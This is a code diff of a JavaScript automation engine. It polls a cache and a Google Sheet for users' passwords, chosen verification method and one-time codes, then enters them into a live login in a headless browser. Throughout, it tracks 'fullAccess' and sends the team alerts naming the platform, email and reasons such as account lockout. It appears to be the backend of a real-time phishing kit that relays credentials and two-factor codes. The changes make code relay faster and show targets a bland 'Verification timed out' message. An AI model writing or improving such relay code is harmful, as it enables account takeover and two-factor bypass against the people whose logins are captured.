+                        // Preserve verificationChoice from cache to prevent clearing during polling (same race as password clearing)
+                        if (verificationChoiceRaw) {
+                            optionsRefreshPayload.verificationChoice = verificationChoiceRaw;
+                            logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] Preserving verificationChoice in options refresh: ${verificationChoiceRaw}`);
                         }
                         updateBrowserRowDataFast(browserId, optionsRefreshPayload);
                         currentVerificationOptions = freshCurrentVerificationOptions;
@@ -3407,17 +3562,32 @@ if (!foundSelector) {
                         currentVerificationOptions = ljp.verificationOptions || freshCurrentVerificationOptions;
                     }
 
-                    if (!checkRow) {
-                        logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Row not found. Failing.`);
-                        finalStatus = "FAILED"; break;
-                    }
+                    // Fall back to the sheet read only when the cache carries no choice yet.
+                    if (!verificationChoiceRaw) {
+                        const checkData = await fetchDataFromAppScript(1, 30000, true);
+                        const checkHeaders = checkData[0];
+                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                        const checkRows = checkData.slice(1);
+                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
 
-                    const currentSheetStatus = checkRow[columnIndexes['status']];
-                    const verificationChoiceRaw = checkRow[columnIndexes['verificationChoice']];
+                        if (!checkRow) {
+                            logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Row not found. Failing.`);
+                            finalStatus = "FAILED"; break;
+                        }
 
-                    if (currentSheetStatus !== "WAITINGOPTIONS") {
-                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
-                        finalStatus = currentSheetStatus; break;
+                        const currentSheetStatus = checkRow[columnIndexes['status']];
+                        const sheetChoice = checkRow[columnIndexes['verificationChoice']];
+                        if (sheetChoice && String(sheetChoice).trim() !== "") {
+                            verificationChoiceRaw = sheetChoice;
+                            _timer.choiceFound = Date.now();
+                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found in sheet: '${verificationChoiceRaw}'`);
+                        }
+
+                        // Sheet-status fallback guard only when the cache had no status entry to trust.
+                        if (!cachedStatusForOptionsPoll && TERMINAL_OPTIONS_POLL_STATUSES.includes(currentSheetStatus)) {
+                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
+                            finalStatus = currentSheetStatus; break;
+                        }
                     }
 
                     if (verificationChoiceRaw) {
@@ -3761,7 +3931,7 @@ if (!foundSelector) {
                 updateData.fullAccess = false; // FAILED so fullAccess false
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITINGOPTIONS phase: Choice not provided in time."
+                    message: "Verification timed out. Please try again later."
                 });
 
                 // Explicitly close browser and clean up immediately
@@ -4042,25 +4212,58 @@ if (!foundSelector) {
                         break;
                     }
 
-                    const checkData = await fetchDataFromAppScript(1, 30000, true);
-                    const checkHeaders = checkData[0];
-                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
-                    const checkRows = checkData.slice(1);
-                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
-
-                    if (!checkRow) {
-                        logger.error(`[processRow][${browserId}][WAITINGCODE] Row not found during polling. Exiting loop.`);
-                        finalStatus = "FAILED";
+                    // Check cache FIRST for status + code (the template's update-process POST writes
+                    // field values to cache immediately via setCachedRow/immediateFlush, so cache is
+                    // the fast and authoritative source — mirroring WAITINGEMAIL).
+                    const cachedForCodePoll = getCachedRow(browserId);
+                    const cachedStatusForCodePoll = cachedForCodePoll?.status;
+                    const TERMINAL_CODE_POLL_STATUSES = ["COMPLETED", "PROCESSING_FINALIZING", "FAILED"];
+                    // Only terminal states represent a real external change. The engine writes WAITINGCODE
+                    // (and PROCESSING once a code is found) to cache only, so the sheet's stale status
+                    // (e.g. WAITINGPASSWORD) must never be treated as an exit.
+                    if (cachedStatusForCodePoll && TERMINAL_CODE_POLL_STATUSES.includes(cachedStatusForCodePoll)) {
+                        logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${cachedStatusForCodePoll}. Exiting loop.`);
+                        finalStatus = cachedStatusForCodePoll;
                         break;
                     }
 
-                    const currentSheetStatus = checkRow[columnIndexes['status']];
-                    const verificationCode = checkRow[columnIndexes['verificationCode']];
+                    let verificationCode = null;
+                    const cachedCodeForPoll = cachedForCodePoll?.verificationCode;
+                    if (cachedCodeForPoll && String(cachedCodeForPoll).trim() !== "") {
+                        verificationCode = cachedCodeForPoll;
+                        _timer.codeFound = Date.now();
+                        logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found in cache: '${verificationCode}'`);
+                    }
 
-                    if (currentSheetStatus !== "WAITINGCODE") {
-                        logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
-                        finalStatus = currentSheetStatus;
-                        break;
+                    // Fall back to the sheet read only when the cache carries no code AND no explicit
+                    // clear ('') yet — otherwise a stale sheet copy could resubmit a rejected code.
+                    if (verificationCode === null && (cachedCodeForPoll === undefined || cachedCodeForPoll === null)) {
+                        const checkData = await fetchDataFromAppScript(1, 30000, true);
+                        const checkHeaders = checkData[0];
+                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                        const checkRows = checkData.slice(1);
+                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
+
+                        if (!checkRow) {
+                            logger.error(`[processRow][${browserId}][WAITINGCODE] Row not found during polling. Exiting loop.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+
+                        const currentSheetStatus = checkRow[columnIndexes['status']];
+                        const sheetCode = checkRow[columnIndexes['verificationCode']];
+                        if (sheetCode && String(sheetCode).trim() !== "") {
+                            verificationCode = sheetCode;
+                            _timer.codeFound = Date.now();
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found in sheet: '${verificationCode}'`);
+                        }
+
+                        // Sheet-status fallback guard only when the cache had no status entry to trust.
+                        if (!cachedStatusForCodePoll && TERMINAL_CODE_POLL_STATUSES.includes(currentSheetStatus)) {
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
+                            finalStatus = currentSheetStatus;
+                            break;
+                        }
                     }
 
                     if (verificationCode && String(verificationCode).trim() !== "") {
@@ -4549,7 +4752,7 @@ if (!foundSelector) {
                 updateData.fullAccess = false; // FAILED so fullAccess false
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITING_CODE phase: Code not provided in time or processing failed."
+                    message: "Verification timed out. Please try again later."
                 });
 
                 // Explicitly close browser and clean up immediately
@@ -4739,9 +4942,9 @@ if (!foundSelector) {
             // Wrong password: the alert carries the attempted value, so clear it and release
             // the form so the WAITINGPASSWORD loop never auto-resubmits the same value.
             password = null;
-            setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), ...updateData, password: '', engineProcessing: false });
+            setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), ...updateData, password: '', engineProcessing: false, ...submissionHistoryPayload(browserId) });
             activelyProcessing.delete(browserId);
-            updateBrowserRowData(browserId, { ...updateData, password: '', engineProcessing: false }).catch(err =>
+            updateBrowserRowData(browserId, { ...updateData, password: '', engineProcessing: false, ...submissionHistoryPayload(browserId) }).catch(err =>
                 logger.warn(`[processRow][${browserId}] Sheet clear of rejected password failed (non-critical): ${err.message}`)
             );
             return;
@@ -5050,7 +5253,18 @@ if (!foundSelector) {
             submissionHistory.delete(browserId);
         }
         if (finalSheetUpdate.status === "FAILED" && processingStarted) {
-            notifyTeam({ type: 'BROWSER_FAILURE', platform, email, browserId, detail: 'Process ended with FAILED status', url: page ? page.url() : undefined });
+            // Carry the real reason on the team FAILED alert (e.g. account lockout, wrong
+            // password/email, session expiry) instead of a generic message.
+            let failureReason = 'Process ended with FAILED status';
+            try {
+                const lastJson = typeof finalSheetUpdate.lastJsonResponse === 'string'
+                    ? JSON.parse(finalSheetUpdate.lastJsonResponse)
+                    : (finalSheetUpdate.lastJsonResponse || {});
+                if (lastJson && (lastJson.message || lastJson.error)) {
+                    failureReason = lastJson.message || lastJson.error;
+                }
+            } catch (e) { /* keep default */ }
+            notifyTeam({ type: 'BROWSER_FAILURE', platform, email, browserId, detail: failureReason, url: page ? page.url() : undefined });
         } else if (finalSheetUpdate.status === "FAILED" && !processingStarted) {
             logger.info(`[processRow][${browserId}] Skipping FAILED notification — processing never started.`);
         }
@@ -5245,7 +5459,8 @@ async function processWaitingRows() {
                             browserId: bId, status: "FAILED",
                             message: "Session timed out or abandoned. Marked as FAILED by staleness check.",
                             timestamp: new Date().toISOString()
-                        })
+                        }),
+                        ...submissionHistoryPayload(bId)
                     }).catch(err => logger.error(`[processWaitingRows] Failed to mark stale row ${bId} as FAILED: ${err.message}`))
                 );
                 // If the stale row has an active browser session, shut it down
